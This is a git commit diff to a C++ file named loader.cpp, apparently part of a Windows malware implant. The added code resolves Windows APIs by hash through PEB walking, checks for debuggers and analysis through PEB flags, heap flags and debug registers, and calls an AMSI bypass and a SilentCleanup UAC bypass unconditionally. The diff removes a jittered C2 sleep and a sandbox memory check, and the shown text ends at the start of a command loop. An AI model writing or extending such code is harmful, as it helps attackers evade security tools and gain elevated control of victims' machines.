0ac834a52c630e1dfbc1f41b11385ab3e2610377
j3susangar1ca <j3susangar1ca@gmail.com>
2026-04-26 00:50:54 -0600

    u

--- example/vector/src/loader.cpp
+++ example/vector/src/loader.cpp
@@ -31,18 +31,45 @@ typedef struct _API_TABLE {
 
 static API_TABLE g_ApiTable = {0};
 
+static PVOID GetModuleBaseByHash(uint32_t hash) {
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
+    PLIST_ENTRY current = head->Flink;
+
+    while (current != head) {
+        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash) return entry->DllBase;
+        current = current->Flink;
+    }
+    return NULL;
+}
+
+static PVOID ResolveApiByHash(PVOID moduleBase, uint32_t hash) {
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfFunctions);
+    PWORD pOrds = (PWORD)((PBYTE)moduleBase + pExport->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        if (HashStringDjb2A((LPCSTR)((PBYTE)moduleBase + pNames[i])) == hash) {
+            return (PVOID)((PBYTE)moduleBase + pFuncs[pOrds[i]]);
+        }
+    }
+    return NULL;
+}
+
 static void InitializeApiTable() {
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    PVOID hNtdll = GetModuleBaseByHash(HASH_NTDLL);
+    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
 
     g_ApiTable.NtAllocateVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtAllocateVirtualMemory);
     g_ApiTable.NtAllocateVirtualMemory.ssn = GetSSN(g_ApiTable.NtAllocateVirtualMemory.address);
-
+    
     g_ApiTable.NtProtectVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtProtectVirtualMemory);
     g_ApiTable.NtProtectVirtualMemory.ssn = GetSSN(g_ApiTable.NtProtectVirtualMemory.address);
-
-    g_ApiTable.NtWriteVirtualMemory.address = ResolveApiByHash(hNtdll, HASH_NtWriteVirtualMemory);
-    g_ApiTable.NtWriteVirtualMemory.ssn = GetSSN(g_ApiTable.NtWriteVirtualMemory.address);
 
     g_ApiTable.CreateWaitableTimerW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_CreateWaitableTimerW);
     g_ApiTable.SetWaitableTimer = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_SetWaitableTimer);
@@ -50,43 +77,35 @@ static void InitializeApiTable() {
     g_ApiTable.GetModuleFileNameW = (ULONG_PTR)ResolveApiByHash(hKernel32, HASH_GetModuleFileNameW);
 }
 
-static void StealthSleep(DWORD dwBaseMS) {
-    srand((unsigned int)time(NULL));
-    float jitter = (float)(rand() % (C2_JITTER * 2) - C2_JITTER) / 100.0f;
-    DWORD dwSleepTime = dwBaseMS + (DWORD)(dwBaseMS * jitter);
+static BOOL IsEnvironmentSafe() {
+    PPEB peb = (PPEB)__readgsqword(0x60);
+    if (peb->BeingDebugged) return FALSE;
+    if (peb->NtGlobalFlag & 0x70) return FALSE;
 
-    HANDLE hTimer = ((HANDLE(WINAPI *)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR))g_ApiTable.CreateWaitableTimerW)(NULL, FALSE, NULL);
-    if (!hTimer) return;
+    PVOID pHeap = (PVOID)*(PULONG_PTR)((PBYTE)peb + (sizeof(PVOID) * 2));
+    DWORD heapFlags = *(PDWORD)((PBYTE)pHeap + (sizeof(PVOID) * 3));
+    if (heapFlags & ~HEAP_GROWABLE) return FALSE;
 
-    LARGE_INTEGER liDueTime;
-    liDueTime.QuadPart = -(LONGLONG)dwSleepTime * 10000LL;
-    ((BOOL(WINAPI *)(HANDLE, const LARGE_INTEGER*, LONG, PTIMERAPCROUTINE, LPVOID, BOOL))g_ApiTable.SetWaitableTimer)(hTimer, &liDueTime, 0, NULL, NULL, FALSE);
-    
-    WaitForSingleObject(hTimer, INFINITE);
-    CloseHandle(hTimer);
-}
+    CONTEXT ctx = {0};
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (GetThreadContext(GetCurrentThread(), &ctx)) {
+        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return TRUE;
+    }
 
-static BOOL IsTargetEnvironment() {
-    MEMORYSTATUSEX statex;
-    statex.dwLength = sizeof(statex);
-    GlobalMemoryStatusEx(&statex);
-    if (statex.ullTotalPhys < (8ULL * 1024 * 1024 * 1024)) return FALSE;
     return TRUE;
 }
 
 int main() {
+    if (!IsEnvironmentSafe()) return 0;
+    
     g_SyscallGadget = FindSyscallGadget();
     InitializeApiTable();
 
     BypassAMSI_DataOnly();
 
-    if (!IsTargetEnvironment()) return 0;
-
-    if (GetCurrentProcessId() % 2 == 0) { // Dummy check for elevation context
-        wchar_t selfPath[MAX_PATH];
-        GetModuleFileNameW(NULL, selfPath, MAX_PATH);
-        BypassUAC_SilentCleanup(selfPath);
-    }
+    wchar_t selfPath[MAX_PATH];
+    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
+    BypassUAC_SilentCleanupHardened(selfPath);
 
     char cmdBuffer[1024];
     while (TRUE) {
